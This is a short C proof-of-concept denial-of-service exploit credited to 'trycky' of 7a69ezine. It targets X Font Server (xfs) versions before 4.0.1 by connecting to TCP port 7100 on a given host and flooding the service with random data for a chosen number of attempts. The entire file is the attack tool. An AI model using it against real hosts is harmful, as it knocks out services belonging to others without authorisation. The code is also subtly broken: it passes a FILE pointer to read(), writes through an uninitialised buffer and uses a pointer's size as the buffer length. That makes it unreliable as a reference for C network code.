/*
  DoS for xfs < 4.0.1 . Proof of concept DOS
  trycky#7a69 : trycky@7a69ezine.org 
*/

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

long resuelve(char *nom);

int main(int argc,char *argv[])
{
  FILE *f;
  char *buf;
  u_long host;
  int fd,intentos,i;
  struct sockaddr_in addr;

  if(argc<3){
    printf("DoS for XFS 4.0.1 . trycky@7a69ezine.org\n");
    printf("intentos = 500-2000\n");
    printf("%s host intentos\n",argv[0]);
    exit(0); }

  host=resuelve(argv[1]);
  intentos=atoi(argv[2]);

  addr.sin_addr.s_addr=host;
  addr.sin_family=AF_INET;
  addr.sin_port=htons(7100); // font-service    7100/tcp        xfs 

 printf("DoS : %s:%d\tIntentos => %d\n",argv[1],addr.sin_port,intentos);

  if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1 ){
    perror("socket()");
    exit(1); }

  if (connect(fd,(struct sockaddr *)&addr, sizeof(addr)) == -1 ){
    perror("connect()");
    exit(1); }
      
  if((f=fopen("/dev/urandom","r"))==NULL){
    perror("fopen()");
    exit(1); }

  for(i=0;i<=intentos;i++) {
    read(f,buf,sizeof(buf));
    write(fd,buf,sizeof(buf));
  }
  printf("DoS complete.\n");
  fclose(f); 
  close(fd);
  exit(0);
}

long resuelve(char *nom)
{
  long re;
  struct hostent *nm;
  re = inet_addr(nom);
  nm = gethostbyname(nom);
  if (re == -1)
    {
      if (nm != NULL) {
        bcopy(nm->h_addr,(char *)&re,nm->h_length);
        return re;
      }
      perror("gethostbyname");
      exit(0);
    }
  return re;
}





